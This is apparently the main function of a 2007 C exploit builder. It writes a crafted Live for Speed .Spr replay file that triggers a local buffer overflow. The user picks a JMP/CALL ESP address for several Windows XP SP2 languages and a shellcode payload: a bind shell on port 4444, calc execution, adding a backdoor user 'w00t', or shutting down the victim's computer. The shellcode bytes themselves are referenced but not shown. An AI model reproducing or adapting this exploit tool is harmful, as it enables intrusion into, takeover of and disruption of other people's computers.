int main(){

FILE *File;

int i = 0;

    if((File=fopen(Spr_file,"wb")) == NULL){
               printf("f**k We are Unable to build the file %s",Spr_file);
               exit(0);
       
    }
   system("cls");
   printf("\n *************************************************");
   printf("\n *Live for speed .Spr local file buffer overflow *");
   printf("\n *************************************************");
   printf("\n *          Special thanks to Str0ke             *");
   printf("\n *************************************************");
   printf("\n * Shout's ~ str0ke ~ c0ntex ~ marsu ~v9@fakehalo*");
   printf("\n *          Date : August 4 2007                 *");
   printf("\n *************************************************");
   printf("\n *      Creating .Spr replay File please wait !! *");
   printf("\n *************************************************");
   Sleep(4000);
   system("cls");
    {    
    for(i=0;i<sizeof(file_header1)-1;i++)  
              fputc(file_header1[i],File);  
       
    for (int i=0;i<89;i++)                 
    fputs("A", File);                       
    }
    
    int input;
    printf( "[1]. English  Jmp_esp  win xp sp2 \n" );
    printf( "[2]. French  Call_esp win xp sp2 \n" );
    printf( "[3]. German  Jmp_esp  win xp sp2 \n" );
    printf( "[4]. To exit and cancel\n" );
    printf( "Pick your jmp esp: " );
    scanf( "%d", &input );
    switch ( input ) {
        case 1:            
            fputs(JMP_ESP_English,File);
            break;
        case 2:          
            fputs(CALL_ESP_French,File);
            break;
        case 3:        
            fputs(JMP_ESP_German,File);
            break;
        case 4:        
            exit(0);
            break;                                    
    Sleep(500);
    }
    system("cls");
    printf( "[1].Bind to port shell code port 4444\n");
    printf( "[2].Execute calc.exe shell code\n");
    printf( "[3].Add user shell code PASS=w00t USER=w00t\n");
    printf( "[4].Shut down user's computer\n");
    printf( "[5].To exit and cancel\n" );
    printf( "Pick your shell code: " );
    scanf( "%d", &input );
    switch ( input ) {
        case 1:            
            for(i=0;i<sizeof(shellcode)-1;i++)    
            fputc(shellcode[i],File);  
        break;
        case 2:            
            for(i=0;i<sizeof(calc_shellcode)-1;i++)    
            fputc(calc_shellcode[i],File);  
        break;     
        case 3:            
            for(i=0;i<sizeof(adduser_shellcode)-1;i++)    
            fputc(adduser_shellcode[i],File);  
        break;  
        case 4:
            for(i=0;i<sizeof(Log_off_shellcode)-1;i++)    
            fputc(Log_off_shellcode[i],File);  
           break;
        case 5:
        exit(0);
        break;
    }
    Sleep(500);
    for (int i=0;i<300;i++)               
    fputs("B", File);                          
    for(i=0;i<sizeof(file_header2)-1;i++)  
              fputc(file_header2[i],File); 
    {
    fclose(File); 
    system("cls");
    printf("%s successfully created..\n",Spr_file); 
    printf("%s \n",Credits_to);                                                                            
    Sleep(3000);
    return 0;
    }
}